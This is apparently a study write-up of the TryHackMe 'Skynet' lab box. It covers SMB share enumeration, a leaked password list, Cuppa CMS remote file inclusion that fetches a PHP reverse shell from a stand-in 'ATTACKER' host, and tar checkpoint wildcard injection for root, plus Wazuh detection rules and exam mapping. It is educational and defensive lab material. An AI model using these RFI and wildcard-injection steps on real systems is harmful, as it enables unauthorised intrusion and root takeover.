# Skynet — TryHackMe

> **Preparation stub.** Based on publicly documented information about this room — not an original
> solve, and no live flag values are recorded. Use this as a study scaffold; complete the bracketed
> fields when working the box under your own account. Only document legally authorised activity.

## Engagement metadata

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Machine | Skynet |
| Difficulty | Easy |
| Category | Linux |
| Target IP | 10.10.x.x (lab-assigned) |
| Date completed | [YYYY-MM-DD] |

## Executive summary

A Linux host running a webmail portal and Samba. An anonymous SMB share leaks a **password list**;
one entry logs into **SquirrelMail** as `milesdyson`, whose inbox reveals the **Samba password**. A
private share points to a **hidden web directory** running **Cuppa CMS**, vulnerable to **remote
file inclusion (RFI)**, which yields a `www-data` shell. A root **cron job** runs `tar` with a
wildcard in a writable directory, exploited via **tar checkpoint wildcard injection** for root.

## Key vulnerability class

- **CWE:** CWE-98 (PHP remote file inclusion) for the foothold; CWE-78 (OS command injection via tar
  `--checkpoint-action` wildcard) for privesc.
- **Why it matters:** a multi-stage credential-chaining path (share → webmail → share → web app) plus
  the wildcard-injection privesc — a frequently-tested, very transferable cron misconfiguration.

## 1. Reconnaissance

```
nmap -sC -sV -p- --min-rate 1000 -oA nmap/skynet 10.10.x.x
```

Expected exposed surface (confirm on completion):

| Port | Service | Note |
|------|---------|------|
| 22/tcp | SSH | Lateral once creds found |
| 80/tcp | http (Apache) | Webmail + the hidden CMS dir |
| 110/143 | POP3 / IMAP (Dovecot) | Mail services |
| 139/445 | Samba | **Anonymous share leak** |

**nmap flag rationale:**
- `-sV` — identifies Samba + Dovecot + Apache; the mail stack is part of the credential chain.
- `-sC` — `smb-enum-shares`/`smb-os-discovery` surface the anonymous share immediately.
- `-p-` — confirms nothing exotic on a high port; keeps the focus on 80/445.

## 2. Enumeration

```
smbclient -N -L //10.10.x.x/
smbclient -N //10.10.x.x/anonymous        # readable anonymously
# retrieve attention.txt and logs/log1.txt
gobuster dir -u http://10.10.x.x/ -w /usr/share/wordlists/dirb/common.txt
```
- The `anonymous` share holds `logs/log1.txt` — a **password list**. `attention.txt` hints the
  passwords were reset.
- Web root → `/squirrelmail/` login. Try the leaked passwords against user `milesdyson`.
- Logged-in inbox contains the **new Samba password**; mount the private `milesdyson` share → its
  `important.txt` names a **hidden directory** `/45kra24zxs28v3yd/` under the web root.
- Brute that hidden dir with gobuster → `/administrator/` → **Cuppa CMS**.

**Tool selection:** `smbclient` for shares; a browser for SquirrelMail; `gobuster`/`feroxbuster`
with a sane wordlist for the hidden CMS — the path is enumeration-led, not exploit-led.

## 3. Exploitation

- Cuppa CMS RFI in `alertConfigField.php?urlConfig=`:
  `http://10.10.x.x/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER/php-reverse-shell.txt`
- Host a PHP reverse shell on your box; the include fetches and executes it → shell as **www-data**.
- *Vector choice:* RFI over LFI because the app fetches remote URLs; record that LFI to log-poisoning
  was the fallback if remote includes were disabled.
- [User flag on completion.]

## 4. Post-exploitation (privilege escalation)

```
cat /etc/crontab          # root runs: cd /home/milesdyson/backups && tar -zcf .../backup.tgz *
ls -la /home/milesdyson/backups
```
- The cron uses a **wildcard `*`** in a directory you can write to. Plant flag-files that `tar` will
  read as options (**checkpoint wildcard injection**):
  ```
  echo 'mkfifo /tmp/f; ...reverse shell...' > shell.sh
  echo "" > "--checkpoint=1"
  echo "" > "--checkpoint-action=exec=sh shell.sh"
  ```
- When the root cron runs `tar ... *`, the crafted filenames become `tar` arguments and execute
  `shell.sh` as **root**.
- [Root flag on completion.]

## 5. Tools used

`nmap`, `smbclient`, `gobuster`/`feroxbuster`, browser (SquirrelMail), a hosted PHP reverse shell,
`nc`, GTFOBins (tar wildcard technique).

## 6. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Credential Access | Unsecured credentials in files | T1552.001 |
| Credential Access | Brute force / password guessing | T1110.001 |
| Discovery | File and directory discovery | T1083 |
| Initial Access / Execution | Exploit public-facing app (RFI) | T1190 |
| Execution | Unix shell | T1059.004 |
| Privilege Escalation | Scheduled task/job — cron | T1053.003 |
| Privilege Escalation | Command injection via wildcard | T1059 (tar abuse) |

## 7. Key learnings

- **Credential chaining:** share → webmail → share → web app. Each leak unlocks the next; document
  the chain.
- **base64/plaintext password lists** in shares are unsecured credentials, not security.
- **Wildcard injection** (`tar *`, `chown *`, `rsync *`) is a top cron-privesc pattern — check
  GTFOBins for any binary a root cron runs over user-writable files.

## 8. Defender perspective — logs & detection

- **Samba logs:** anonymous session reads of a share containing credential files.
- **Apache access log:** the RFI request — a `urlConfig=` parameter containing `http://` to an
  external host is the unmistakable RFI signature.
- **auditd execve:** root cron spawning `sh`/a reverse shell as a child of `tar` — `tar` should never
  parent an interactive shell.
- **FIM (syscheck):** creation of files named `--checkpoint*` in the backups directory.

### Wazuh detection rule (→ [watchtower](../../watchtower))

```xml
<group name="web,apache,auditd,attack,">
  <!-- RFI: external URL in a request parameter -->
  <rule id="100510" level="12">
    <decoded_as>web-accesslog</decoded_as>
    <url type="pcre2">urlConfig=https?://</url>
    <description>Remote File Inclusion — external URL in parameter (T1190)</description>
    <mitre><id>T1190</id></mitre>
  </rule>
  <!-- tar spawning a shell = wildcard checkpoint injection -->
  <rule id="100511" level="14">
    <if_group>audit_command</if_group>
    <field name="audit.exe" type="pcre2">/(sh|bash)$</field>
    <field name="audit.ppid_exe" type="pcre2">/tar$</field>
    <description>tar spawned a shell — wildcard checkpoint injection privesc (T1059)</description>
    <mitre><id>T1059</id><id>T1053.003</id></mitre>
  </rule>
</group>
```
**Validation:** host the RFI payload + plant the checkpoint files; confirm 100510 on the include and
100511 when the cron fires. Sub-techniques: **T1552.001**, **T1110.001**, **T1190**, **T1053.003**.

## Exam relevance — Sec+ SY0-701

| SY0-701 objective | How Skynet makes it concrete |
|-------------------|-------------------------------|
| **2.2** Application attacks — injection/inclusion | RFI is the "malicious file inclusion" attack class. |
| **2.2 / 4.6** Unsecured credentials | The leaked password list = credentials stored insecurely. |
| **2.3** Misconfiguration — least privilege | A root cron over a user-writable dir is the privilege-boundary failure. |
| **2.4** Indicators | `urlConfig=http://` and `tar`→shell are textbook indicators (§8). |
| **4.1** Hardening | Disable remote includes (`allow_url_include=Off`), fix the cron — the hardening answers. |

**Interview line:** "Skynet is a credential-chaining box ending in a wildcard-injection privesc —
it's why I check every root cron that touches a user-writable path against GTFOBins."

## 9. References

- Cuppa CMS RFI (`alertConfigField.php`) — verify exact advisory before citing.
- GTFOBins — `tar` wildcard `--checkpoint-action` technique.
- MITRE ATT&CK T1190 / T1552.001 / T1053.003 / T1059.004.
